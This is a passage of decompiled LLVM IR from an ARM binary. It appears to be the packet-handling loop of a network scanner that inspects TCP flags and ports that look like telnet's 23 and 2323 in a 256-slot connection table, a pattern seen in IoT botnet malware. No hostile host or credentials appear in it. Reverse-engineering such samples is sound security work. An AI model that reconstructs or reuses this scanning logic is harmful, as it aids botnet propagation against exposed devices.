  %v2_fb3c = inttoptr i32 %v1_fb3c to i32*
  br label %dec_label_pc_fa1c

dec_label_pc_fa1c:                                ; preds = %dec_label_pc_fafc, %dec_label_pc_faf4, %dec_label_pc_faec, %dec_label_pc_fabc, %dec_label_pc_faac, %dec_label_pc_fa88, %dec_label_pc_fa70, %dec_label_pc_fae4, %dec_label_pc_fad8, %dec_label_pc_fa68, %dec_label_pc_fb9c, %dec_label_pc_fa10
  store i32 0, i32* %v2_fa24, align 4
  %v2_fa2c = load i32, i32* @global_var_1cb3c.145, align 4
  store i32 %v2_fa2c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v0_fa88, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v7_fa4c = call i32 @function_1231c(i32 %v2_fa2c, i32* %v6_fa4c, i32 1514, i32 16384, i32 0, i32 0)
  store i32 %v7_fa4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fa50 = icmp eq i32 %v7_fa4c, 0
  store i1 %v2_fa50, i1* %cpsr_z.global-to-local, align 1
  %tmp350 = icmp slt i32 %v7_fa4c, 1
  br i1 %tmp350, label %dec_label_pc_fbbc, label %dec_label_pc_fa58

dec_label_pc_fa58:                                ; preds = %dec_label_pc_fa1c
  store i32 %v0_fa10, i32* %lr.global-to-local, align 4
  %v2_fa5c = load i32, i32* %v2_fa24, align 4
  store i32 %v2_fa5c, i32* %r3.global-to-local, align 4
  %v2_fa60 = icmp ugt i32 %v2_fa5c, 10
  store i1 %v2_fa60, i1* %cpsr_c.global-to-local, align 1
  %v7_fa60 = icmp eq i32 %v2_fa5c, 11
  store i1 %v7_fa60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa60, label %dec_label_pc_fbbc, label %dec_label_pc_fa68

dec_label_pc_fa68:                                ; preds = %dec_label_pc_fa58
  %v2_fa68 = icmp ugt i32 %v7_fa4c, 38
  store i1 %v2_fa68, i1* %cpsr_c.global-to-local, align 1
  %v7_fa68 = icmp eq i32 %v7_fa4c, 39
  store i1 %v7_fa68, i1* %cpsr_z.global-to-local, align 1
  %v2_fa6c = xor i1 %v2_fa68, true
  %v3_fa6c = or i1 %v7_fa68, %v2_fa6c
  br i1 %v3_fa6c, label %dec_label_pc_fa1c, label %dec_label_pc_fa70

dec_label_pc_fa70:                                ; preds = %dec_label_pc_fa68
  store i32 %v0_fa88, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cb1c.49 to i32), i32* %r1.global-to-local, align 4
  %v3_fa78 = load i32, i32* %v2_fa78, align 4
  store i32 %v3_fa78, i32* %r2.global-to-local, align 4
  %v2_fa7c = load i32, i32* @global_var_1cb1c.49, align 4
  store i32 %v2_fa7c, i32* %r3.global-to-local, align 4
  %v3_fa80 = icmp uge i32 %v3_fa78, %v2_fa7c
  store i1 %v3_fa80, i1* %cpsr_c.global-to-local, align 1
  %v9_fa80 = icmp eq i32 %v3_fa78, %v2_fa7c
  store i1 %v9_fa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fa80, label %dec_label_pc_fa88, label %dec_label_pc_fa1c

dec_label_pc_fa88:                                ; preds = %dec_label_pc_fa70
  %v3_fa88 = load i8, i8* %v2_fa88, align 1
  %v4_fa88 = zext i8 %v3_fa88 to i32
  store i32 %v4_fa88, i32* %r3.global-to-local, align 4
  %v2_fa8c = icmp ugt i8 %v3_fa88, 5
  store i1 %v2_fa8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fa8c = icmp eq i8 %v3_fa88, 6
  store i1 %v7_fa8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa8c, label %dec_label_pc_fa94, label %dec_label_pc_fa1c

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa88
  store i32 %v4_fa94, i32* %r3.global-to-local, align 4
  %v2_fa98 = load i8, i8* %stack_var_-1884.0, align 1
  %v3_fa98 = zext i8 %v2_fa98 to i32
  store i32 %v3_fa98, i32* %r2.global-to-local, align 4
  %v3_fa9c = load i8, i8* %v2_fa9c, align 1
  %v4_fa9c = zext i8 %v3_fa9c to i32
  store i32 %v4_fa9c, i32* %r3.global-to-local, align 4
  %v4_faa0 = mul nuw nsw i32 %v4_fa9c, 256
  %v5_faa0 = or i32 %v4_faa0, %v3_fa98
  store i32 %v5_faa0, i32* %r2.global-to-local, align 4
  %v2_faa4 = icmp ugt i32 %v5_faa0, 5887
  store i1 %v2_faa4, i1* %cpsr_c.global-to-local, align 1
  %v7_faa4 = icmp eq i32 %v5_faa0, 5888
  store i1 %v7_faa4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faa4, label %dec_label_pc_fabc, label %dec_label_pc_faac

dec_label_pc_faac:                                ; preds = %dec_label_pc_fa94
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_fab4 = icmp ugt i32 %v5_faa0, 4872
  store i1 %v3_fab4, i1* %cpsr_c.global-to-local, align 1
  %v9_fab4 = icmp eq i32 %v5_faa0, 4873
  store i1 %v9_fab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fab4, label %dec_label_pc_fabc, label %dec_label_pc_fa1c

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faac, %dec_label_pc_fa94
  store i32 %v4_fa94, i32* %ip.global-to-local, align 4
  %v3_fac0 = load i8, i8* %v2_fac0, align 1
  %v4_fac0 = zext i8 %v3_fac0 to i32
  store i32 %v4_fac0, i32* %r3.global-to-local, align 4
  %v3_fac4 = load i8, i8* %v2_fac4, align 1
  %v4_fac4 = zext i8 %v3_fac4 to i32
  store i32 %v4_fac4, i32* %r2.global-to-local, align 4
  store i32 %v4_fac8, i32* %lr.global-to-local, align 4
  %v4_facc = mul nuw nsw i32 %v4_fac4, 256
  %v5_facc = or i32 %v4_facc, %v4_fac0
  store i32 %v5_facc, i32* %r3.global-to-local, align 4
  %v3_fad0 = icmp uge i32 %v5_facc, %v4_fac8
  store i1 %v3_fad0, i1* %cpsr_c.global-to-local, align 1
  %v9_fad0 = icmp eq i32 %v5_facc, %v4_fac8
  store i1 %v9_fad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fad0, label %dec_label_pc_fad8, label %dec_label_pc_fa1c

dec_label_pc_fad8:                                ; preds = %dec_label_pc_fabc
  %v3_fad8 = load i8, i8* %v2_fad8, align 1
  %v4_fad8 = zext i8 %v3_fad8 to i32
  store i32 %v4_fad8, i32* %r3.global-to-local, align 4
  %v1_fadc = and i32 %v4_fad8, 2
  %v2_fadc = icmp eq i32 %v1_fadc, 0
  store i1 %v2_fadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fadc, label %dec_label_pc_fa1c, label %dec_label_pc_fae4

dec_label_pc_fae4:                                ; preds = %dec_label_pc_fad8
  %v1_fae4 = and i32 %v4_fad8, 16
  %v2_fae4 = icmp eq i32 %v1_fae4, 0
  store i1 %v2_fae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fae4, label %dec_label_pc_fa1c, label %dec_label_pc_faec

dec_label_pc_faec:                                ; preds = %dec_label_pc_fae4
  %v1_faec = and i32 %v4_fad8, 4
  %v2_faec = icmp eq i32 %v1_faec, 0
  store i1 %v2_faec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faec, label %dec_label_pc_faf4, label %dec_label_pc_fa1c

dec_label_pc_faf4:                                ; preds = %dec_label_pc_faec
  %tmp504 = urem i8 %v3_fad8, 2
  %v2_faf4 = icmp eq i8 %tmp504, 0
  store i1 %v2_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_faf4, label %dec_label_pc_fafc, label %dec_label_pc_fa1c

dec_label_pc_fafc:                                ; preds = %dec_label_pc_faf4
  %v3_fafc = load i32, i32* %v2_fafc, align 4
  %v2_fb18 = call i32 @llvm.bswap.i32(i32 %v3_fafc)
  %v1_fb1c = add i32 %v2_fb18, -1
  %v1_fb20 = udiv i32 %v1_fb1c, 256
  %v3_fb24 = and i32 %v1_fb20, 65280
  %v1_fb28 = and i32 %v1_fb1c, 65280
  store i32 %v1_fb28, i32* %r2.global-to-local, align 4
  %v3_fb2c = mul i32 %v1_fb1c, 16777216
  %v4_fb30 = udiv i32 %v1_fb1c, 16777216
  %v5_fb30 = or i32 %v3_fb24, %v4_fb30
  store i32 %v5_fb30, i32* %r1.global-to-local, align 4
  store i32 %v0_fa88, i32* %r3.global-to-local, align 4
  %v4_fb38 = mul nuw nsw i32 %v1_fb28, 256
  %v5_fb38 = or i32 %v4_fb38, %v3_fb2c
  store i32 %v5_fb38, i32* %r0.global-to-local, align 4
  %v3_fb3c = load i32, i32* %v2_fb3c, align 4
  store i32 %v3_fb3c, i32* %r2.global-to-local, align 4
  %v2_fb40 = call i32 @llvm.bswap.i32(i32 %v1_fb1c)
  store i32 %v2_fb40, i32* %ip.global-to-local, align 4
  %v3_fb44 = icmp uge i32 %v2_fb40, %v3_fb3c
  store i1 %v3_fb44, i1* %cpsr_c.global-to-local, align 1
  %v9_fb44 = icmp eq i32 %v2_fb40, %v3_fb3c
  store i1 %v9_fb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_fb44, label %dec_label_pc_fb4c, label %dec_label_pc_fa1c

dec_label_pc_fb4c:                                ; preds = %dec_label_pc_fafc
  %v0_fb4c = load i32, i32* @r4, align 4
  %v2_fb4c = icmp ugt i32 %v0_fb4c, 254
  store i1 %v2_fb4c, i1* %cpsr_c.global-to-local, align 1
  %v7_fb4c = icmp eq i32 %v0_fb4c, 255
  store i1 %v7_fb4c, i1* %cpsr_z.global-to-local, align 1
  %v8_fb50 = icmp sgt i32 %v0_fb4c, 255
  br i1 %v8_fb50, label %dec_label_pc_fbbc, label %dec_label_pc_fb54

dec_label_pc_fb54:                                ; preds = %dec_label_pc_fb4c
  store i32 ptrtoint (i32* @global_var_1cb38.143 to i32), i32* %lr.global-to-local, align 4
  %v3_fb58 = mul i32 %v0_fb4c, 256
  store i32 %v3_fb58, i32* %r2.global-to-local, align 4
  %v2_fb5c = load i32, i32* @global_var_1cb38.143, align 4
  store i32 %v2_fb5c, i32* %r1.global-to-local, align 4
  %v2_fb64 = mul i32 %v0_fb4c, 288
  store i32 %v2_fb64, i32* %r3.global-to-local, align 4
  %v2_fb68 = add i32 %v2_fb5c, %v2_fb64
  store i32 %v2_fb68, i32* @r0, align 4
  %v1_fb6c = add i32 %v2_fb68, 12
  %v2_fb6c = inttoptr i32 %v1_fb6c to i32*
  %v3_fb6c = load i32, i32* %v2_fb6c, align 4
  store i32 %v3_fb6c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb70 = icmp eq i32 %v3_fb6c, 0
  store i1 %v2_fb70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fb70, label %dec_label_pc_fb9c, label %dec_label_pc_fb7c.preheader

dec_label_pc_fb7c.preheader:                      ; preds = %dec_label_pc_fb54
  %v2_fb74 = add i32 %v2_fb68, 288
  store i32 %v2_fb74, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fb7c

dec_label_pc_fb7c:                                ; preds = %dec_label_pc_fb7c.preheader, %dec_label_pc_fb88
  %v0_fb88 = phi i32 [ %v2_fb74, %dec_label_pc_fb7c.preheader ], [ %v1_fb94, %dec_label_pc_fb88 ]
  %v0_fb7c = phi i32 [ %v0_fb4c, %dec_label_pc_fb7c.preheader ], [ %v1_fb7c, %dec_label_pc_fb88 ]
  %v1_fb7c = add i32 %v0_fb7c, 1
  store i32 %v1_fb7c, i32* @r4, align 4
  %v7_fb80 = icmp eq i32 %v1_fb7c, 256
  br i1 %v7_fb80, label %dec_label_pc_fbbc.loopexit, label %dec_label_pc_fb88

dec_label_pc_fb88:                                ; preds = %dec_label_pc_fb7c
  store i32 %v0_fb88, i32* @r0, align 4
  %v1_fb8c = add i32 %v0_fb88, 12
  %v2_fb8c = inttoptr i32 %v1_fb8c to i32*
  %v3_fb8c = load i32, i32* %v2_fb8c, align 4
  %v2_fb90 = icmp eq i32 %v3_fb8c, 0
  %v1_fb94 = add i32 %v0_fb88, 288
  store i32 %v1_fb94, i32* %r3.global-to-local, align 4
  br i1 %v2_fb90, label %dec_label_pc_fb9c.loopexit, label %dec_label_pc_fb7c

dec_label_pc_fb9c.loopexit:                       ; preds = %dec_label_pc_fb88
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fb9c

dec_label_pc_fb9c:                                ; preds = %dec_label_pc_fb9c.loopexit, %dec_label_pc_fb54
  %v1_fb9c = phi i32 [ %v0_fb88, %dec_label_pc_fb9c.loopexit ], [ %v2_fb68, %dec_label_pc_fb54 ]
  %v2_fb9c = add i32 %v1_fb9c, 16
  %v3_fb9c = inttoptr i32 %v2_fb9c to i32*
  store i32 %v3_fb3c, i32* %v3_fb9c, align 4
  store i32 %v4_fa94, i32* %r1.global-to-local, align 4
  %v2_fba4 = load i32, i32* %v1_fba4, align 4
  store i32 %v2_fba4, i32* %r2.global-to-local, align 4
  %v1_fba8 = and i32 %v2_fba4, 128
  %v2_fba8 = icmp ne i32 %v1_fba8, 0
  store i1 %v2_fba8, i1* %cpsr_c.global-to-local, align 1
  %v3_fba8 = sdiv i32 %v2_fba4, 256
  store i32 %v3_fba8, i32* %r3.global-to-local, align 4
  %v1_fbac = trunc i32 %v3_fba8 to i8
  %v2_fbac = load i32, i32* @r0, align 4
  %v3_fbac = add i32 %v2_fbac, 21
  %v4_fbac = inttoptr i32 %v3_fbac to i8*
  store i8 %v1_fbac, i8* %v4_fbac, align 1
  %v0_fbb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_fbb0 = trunc i32 %v0_fbb0 to i8
  %v2_fbb0 = load i32, i32* @r0, align 4
  %v3_fbb0 = add i32 %v2_fbb0, 20
  %v4_fbb0 = inttoptr i32 %v3_fbb0 to i8*
  store i8 %v1_fbb0, i8* %v4_fbb0, align 1
  %v0_fbb4 = call i32 @function_f144()
  store i32 %v0_fbb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fa1c

dec_label_pc_fbbc.loopexit:                       ; preds = %dec_label_pc_fb7c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fbbc

dec_label_pc_fbbc:                                ; preds = %dec_label_pc_fb4c, %dec_label_pc_fa58, %dec_label_pc_fa1c, %dec_label_pc_fbbc.loopexit
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1672, i32* %ip.global-to-local, align 4
  %v2_fbd4455 = load i32, i32* @sp, align 4
  %v3_fbd4456 = add i32 %v2_fbd4455, 1672
  %v4_fbd4457 = inttoptr i32 %v3_fbd4456 to i32*
  store i32 0, i32* %v4_fbd4457, align 4
  br label %dec_label_pc_fbc4.dec_label_pc_fbc4_crit_edge

dec_label_pc_fbc4.dec_label_pc_fbc4_crit_edge:    ; preds = %dec_label_pc_fbbc, %dec_label_pc_fbc4.dec_label_pc_fbc4_crit_edge
  %v0_fbc4.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_fbd4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fbc8 = add i32 %v0_fbc4.pre, 4
  store i32 %v1_fbc8, i32* %r3.global-to-local, align 4
  %v1_fbcc = add i32 %v0_fbc4.pre, 1672
  store i32 %v1_fbcc, i32* %ip.global-to-local, align 4
  %v7_fbd0 = icmp eq i32 %v1_fbc8, 128
  %v2_fbd4 = load i32, i32* @sp, align 4
  %v3_fbd4 = add i32 %v2_fbd4, %v1_fbcc
  %v4_fbd4 = inttoptr i32 %v3_fbd4 to i32*
  store i32 %v0_fbd4.pre, i32* %v4_fbd4, align 4
  br i1 %v7_fbd0, label %dec_label_pc_fbdc, label %dec_label_pc_fbc4.dec_label_pc_fbc4_crit_edge

dec_label_pc_fbdc:                                ; preds = %dec_label_pc_fbc4.dec_label_pc_fbc4_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fbdc = load i32, i32* %r2.global-to-local, align 4
  %v1_fbe4449 = add i32 %v0_fbdc, 4
  store i32 %v1_fbe4449, i32* %r3.global-to-local, align 4
  %v1_fbe8450 = add i32 %v0_fbdc, 1544
  store i32 %v1_fbe8450, i32* %lr.global-to-local, align 4
  %v7_fbec451 = icmp eq i32 %v1_fbe4449, 128
  %v2_fbf0452 = load i32, i32* @sp, align 4
  %v3_fbf0453 = add i32 %v2_fbf0452, %v1_fbe8450
  %v4_fbf0454 = inttoptr i32 %v3_fbf0453 to i32*
  store i32 %v0_fbdc, i32* %v4_fbf0454, align 4
  br i1 %v7_fbec451, label %dec_label_pc_fbf8, label %dec_label_pc_fbe0.dec_label_pc_fbe0_crit_edge

dec_label_pc_fbe0.dec_label_pc_fbe0_crit_edge:    ; preds = %dec_label_pc_fbdc, %dec_label_pc_fbe0.dec_label_pc_fbe0_crit_edge
  %v0_fbe0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_fbf0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fbe4 = add i32 %v0_fbe0.pre, 4
  store i32 %v1_fbe4, i32* %r3.global-to-local, align 4
  %v1_fbe8 = add i32 %v0_fbe0.pre, 1544
  store i32 %v1_fbe8, i32* %lr.global-to-local, align 4
  %v7_fbec = icmp eq i32 %v1_fbe4, 128
  %v2_fbf0 = load i32, i32* @sp, align 4
  %v3_fbf0 = add i32 %v2_fbf0, %v1_fbe8
  %v4_fbf0 = inttoptr i32 %v3_fbf0 to i32*
  store i32 %v0_fbf0.pre, i32* %v4_fbf0, align 4
  br i1 %v7_fbec, label %dec_label_pc_fbf8, label %dec_label_pc_fbe0.dec_label_pc_fbe0_crit_edge

dec_label_pc_fbf8:                                ; preds = %dec_label_pc_fbe0.dec_label_pc_fbe0_crit_edge, %dec_label_pc_fbdc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_fbf8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_fbf8, i32* @r6, align 4
  store i32 %v0_fbf8, i32* @r5, align 4
  store i32 %v0_fbf8, i32* @r7, align 4
  store i32 %v0_fbf8, i32* %stack_var_-52, align 4
  br label %dec_label_pc_fc70

dec_label_pc_fc0c:                                ; preds = %dec_label_pc_fc98, %dec_label_pc_fc70
  %storemerge258 = phi i32 [ 30, %dec_label_pc_fc70 ], [ 5, %dec_label_pc_fc98 ]
  store i32 %storemerge258, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cad4.130 to i32), i32* %r2.global-to-local, align 4
  %v2_fc10 = load i32, i32* @global_var_1cad4.130, align 4
  store i32 %v2_fc10, i32* %r3.global-to-local, align 4
  %v1_fc14 = add i32 %v2_fc84, 8
  %v2_fc14 = inttoptr i32 %v1_fc14 to i32*
  %v3_fc14 = load i32, i32* %v2_fc14, align 4
  store i32 %v3_fc14, i32* %r2.global-to-local, align 4
  %v2_fc18 = sub i32 %v2_fc10, %v3_fc14
  store i32 %v2_fc18, i32* %r3.global-to-local, align 4
  %v3_fc1c = icmp uge i32 %v2_fc18, %storemerge258
  store i1 %v3_fc1c, i1* %cpsr_c.global-to-local, align 1
  %v9_fc1c = icmp eq i32 %v2_fc18, %storemerge258
  store i1 %v9_fc1c, i1* %cpsr_z.global-to-local, align 1
  %v2_fc20 = xor i1 %v9_fc1c, true
  %v3_fc20 = and i1 %v3_fc1c, %v2_fc20
  br i1 %v3_fc20, label %dec_label_pc_fcec, label %dec_label_pc_fc24

dec_label_pc_fc24:                                ; preds = %dec_label_pc_fc0c
  store i1 %v2_fc8c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_fc8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fc8c, label %dec_label_pc_fcbc, label %dec_label_pc_fc2c

dec_label_pc_fc2c:                                ; preds = %dec_label_pc_fc24
  %v1_fc2c = add i32 %v2_fc84, 4
  %v2_fc2c = inttoptr i32 %v1_fc2c to i32*
  %v3_fc2c = load i32, i32* %v2_fc2c, align 4
  store i32 %v3_fc2c, i32* %ip.global-to-local, align 4
  %v3_fc30 = udiv i32 %v3_fc2c, 32
  %v2_fc34 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fc34, i32* %r0.global-to-local, align 4
  %v3_fc38 = mul nuw nsw i32 %v3_fc30, 4
  %v2_fc3c = add i32 %v3_fc38, %v2_fc34
  store i32 %v2_fc3c, i32* %r3.global-to-local, align 4
  %v1_fc40 = add i32 %v2_fc3c, -184
  %v2_fc40 = inttoptr i32 %v1_fc40 to i32*
  %v3_fc40 = load i32, i32* %v2_fc40, align 4
  %v1_fc44 = urem i32 %v3_fc2c, 32
  store i32 %v1_fc44, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_fc4c = shl i32 1, %v1_fc44
  %v8_fc4c = or i32 %v3_fc40, %v7_fc4c
  store i32 %v8_fc4c, i32* %r2.global-to-local, align 4
  store i32 %v8_fc4c, i32* %v2_fc40, align 4
  %v0_fc54 = load i32, i32* @r6, align 4
  %v1_fc54 = load i32, i32* %ip.global-to-local, align 4
  %v3_fc54 = icmp uge i32 %v0_fc54, %v1_fc54
  store i1 %v3_fc54, i1* %cpsr_c.global-to-local, align 1
  %v9_fc54 = icmp eq i32 %v0_fc54, %v1_fc54
  store i1 %v9_fc54, i1* %cpsr_z.global-to-local, align 1
  %v5_fc58 = icmp slt i32 %v0_fc54, %v1_fc54
  br i1 %v5_fc58, label %bb352, label %bb353

bb352:                                            ; preds = %dec_label_pc_fc2c
  store i32 %v1_fc54, i32* @r6, align 4
  br label %bb353

bb353:                                            ; preds = %dec_label_pc_fc98, %dec_label_pc_fd2c, %dec_label_pc_fd20, %bb355, %dec_label_pc_fc2c, %bb352
  %stack_var_-1868.0 = phi i32 [ %stack_var_-1868.2, %bb355 ], [ %stack_var_-1868.1, %dec_label_pc_fd2c ], [ %stack_var_-1868.1, %dec_label_pc_fd20 ], [ %stack_var_-1868.1, %bb352 ], [ %stack_var_-1868.1, %dec_label_pc_fc2c ], [ %stack_var_-1868.1, %dec_label_pc_fc98 ]
  %stack_var_-1872.2 = phi i32 [ %stack_var_-1872.4, %bb355 ], [ %stack_var_-1872.3, %dec_label_pc_fd2c ], [ %stack_var_-1872.3, %dec_label_pc_fd20 ], [ %stack_var_-1872.3, %bb352 ], [ %stack_var_-1872.3, %dec_label_pc_fc2c ], [ %stack_var_-1872.3, %dec_label_pc_fc98 ]
  %stack_var_-1884.1 = phi i8* [ %stack_var_-1884.3, %bb355 ], [ %stack_var_-1884.2, %dec_label_pc_fd2c ], [ %stack_var_-1884.2, %dec_label_pc_fd20 ], [ %stack_var_-1884.2, %bb352 ], [ %stack_var_-1884.2, %dec_label_pc_fc2c ], [ %stack_var_-1884.2, %dec_label_pc_fc98 ]
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.3, %bb355 ], [ %stack_var_-1880.2, %dec_label_pc_fd2c ], [ %stack_var_-1880.2, %dec_label_pc_fd20 ], [ %stack_var_-1880.2, %bb352 ], [ %stack_var_-1880.2, %dec_label_pc_fc2c ], [ %stack_var_-1880.2, %dec_label_pc_fc98 ]
  %stack_var_-1876.1 = phi i8 [ %stack_var_-1876.3, %bb355 ], [ %stack_var_-1876.2, %dec_label_pc_fd2c ], [ %stack_var_-1876.2, %dec_label_pc_fd20 ], [ %stack_var_-1876.2, %bb352 ], [ %stack_var_-1876.2, %dec_label_pc_fc2c ], [ %stack_var_-1876.2, %dec_label_pc_fc98 ]
  %v3_fc5c = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_fc5c, i32* %r3.global-to-local, align 4
  %v1_fc60 = add i32 %v3_fc5c, 1
  store i32 %v1_fc60, i32* %r2.global-to-local, align 4
  %v2_fc64 = icmp ugt i32 %v1_fc60, 254
  store i1 %v2_fc64, i1* %cpsr_c.global-to-local, align 1
  %v7_fc64 = icmp eq i32 %v1_fc60, 255
  store i1 %v7_fc64, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_fc60, i32* %stack_var_-52, align 4
  %v8_fc6c = icmp sgt i32 %v1_fc60, 255
  br i1 %v8_fc6c, label %dec_label_pc_fd38, label %dec_label_pc_fc70

dec_label_pc_fc70:                                ; preds = %bb353, %dec_label_pc_fbf8
  %v0_fc7c = phi i32 [ %v0_fbf8, %dec_label_pc_fbf8 ], [ %v1_fc60, %bb353 ]
  %stack_var_-1868.1 = phi i32 [ %v0_fa10, %dec_label_pc_fbf8 ], [ %stack_var_-1868.0, %bb353 ]
  %stack_var_-1872.3 = phi i32 [ %stack_var_-1872.1, %dec_label_pc_fbf8 ], [ %stack_var_-1872.2, %bb353 ]
  %stack_var_-1884.2 = phi i8* [ %stack_var_-1884.0, %dec_label_pc_fbf8 ], [ %stack_var_-1884.1, %bb353 ]
  %stack_var_-1880.2 = phi i32 [ %v0_fa88, %dec_label_pc_fbf8 ], [ %stack_var_-1880.1, %bb353 ]
  %stack_var_-1876.2 = phi i8 [ %stack_var_-1876.0, %dec_label_pc_fbf8 ], [ %stack_var_-1876.1, %bb353 ]
  store i32 ptrtoint (i32* @global_var_1cb38.143 to i32), i32* %r0.global-to-local, align 4
  %v3_fc74 = mul i32 %v0_fc7c, 256
  store i32 %v3_fc74, i32* %r3.global-to-local, align 4
  %v2_fc78 = load i32, i32* @global_var_1cb38.143, align 4
  store i32 %v2_fc78, i32* %r1.global-to-local, align 4
  %v2_fc80 = mul i32 %v0_fc7c, 288
  store i32 %v2_fc80, i32* %r2.global-to-local, align 4
  %v2_fc84 = add i32 %v2_fc78, %v2_fc80
  store i32 %v2_fc84, i32* @r4, align 4
  %v1_fc88 = add i32 %v2_fc84, 12
  %v2_fc88 = inttoptr i32 %v1_fc88 to i32*
  %v3_fc88 = load i32, i32* %v2_fc88, align 4
  store i32 %v3_fc88, i32* %ip.global-to-local, align 4
  %v2_fc8c = icmp ne i32 %v3_fc88, 0
  store i1 %v2_fc8c, i1* %cpsr_c.global-to-local, align 1
  %v7_fc8c = icmp eq i32 %v3_fc88, 1
  store i1 %v7_fc8c, i1* %cpsr_z.global-to-local, align 1
  %v2_fc90 = xor i1 %v7_fc8c, true
  %v3_fc90 = and i1 %v2_fc8c, %v2_fc90
  br i1 %v3_fc90, label %dec_label_pc_fc0c, label %dec_label_pc_fc98

dec_label_pc_fc98:                                ; preds = %dec_label_pc_fc70
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fc98 = icmp eq i32 %v3_fc88, 0
  store i1 %v2_fc98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fc98, label %bb353, label %dec_label_pc_fc0c

dec_label_pc_fca8:                                ; preds = %dec_label_pc_f498
  store i32 ptrtoint (i32* @global_var_1cb3c.145 to i32), i32* %r2.global-to-local, align 4
  %v2_fcac = load i32, i32* @global_var_1cb3c.145, align 4
  store i32 %v2_fcac, i32* %r0.global-to-local, align 4
  %v1_fcb0 = call i32 @function_11af0(i32 %v2_fcac)
  store i32 %v1_fcb0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fcb4

dec_label_pc_fcb4:                                ; preds = %dec_label_pc_f470, %dec_label_pc_fca8
  %v0_fcb4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fcb4, i32* %r0.global-to-local, align 4
  %v1_fcb8 = call i32 @function_12e68(i32 %v0_fcb4)
  store i32 %v1_fcb8, i32* %r0.global-to-local, align 4
  %v0_fcbc.pre = load i32, i32* @r4, align 4
  %v1_fcd8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_fcbc

dec_label_pc_fcbc:                                ; preds = %dec_label_pc_fc24, %dec_label_pc_fcb4
  %v1_fcd8 = phi i32 [ %v1_fcd8.pre, %dec_label_pc_fcb4 ], [ 1, %dec_label_pc_fc24 ]
  %v0_fcbc = phi i32 [ %v0_fcbc.pre, %dec_label_pc_fcb4 ], [ %v2_fc84, %dec_label_pc_fc24 ]
  %stack_var_-1868.2 = phi i32 [ %tmp269, %dec_label_pc_fcb4 ], [ %stack_var_-1868.1, %dec_label_pc_fc24 ]
  %stack_var_-1872.4 = phi i32 [ %tmp276, %dec_label_pc_fcb4 ], [ %stack_var_-1872.3, %dec_label_pc_fc24 ]
  %stack_var_-1884.3 = phi i8* [ %tmp277, %dec_label_pc_fcb4 ], [ %stack_var_-1884.2, %dec_label_pc_fc24 ]
  %stack_var_-1880.3 = phi i32 [ %tmp278, %dec_label_pc_fcb4 ], [ %stack_var_-1880.2, %dec_label_pc_fc24 ]
  %stack_var_-1876.3 = phi i8 [ %tmp279, %dec_label_pc_fcb4 ], [ %stack_var_-1876.2, %dec_label_pc_fc24 ]
  %v1_fcbc = add i32 %v0_fcbc, 4
  %v2_fcbc = inttoptr i32 %v1_fcbc to i32*
  %v3_fcbc = load i32, i32* %v2_fcbc, align 4
  store i32 %v3_fcbc, i32* %r0.global-to-local, align 4
  %v3_fcc0 = udiv i32 %v3_fcbc, 32
  %v3_fcc4 = mul nuw nsw i32 %v3_fcc0, 4
  %v2_fcc8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_fcc8, i32* %lr.global-to-local, align 4
  %v2_fccc = add i32 %v3_fcc4, %v2_fcc8
  store i32 %v2_fccc, i32* %r3.global-to-local, align 4
  %v1_fcd0 = add i32 %v2_fccc, -312
  %v2_fcd0 = inttoptr i32 %v1_fcd0 to i32*
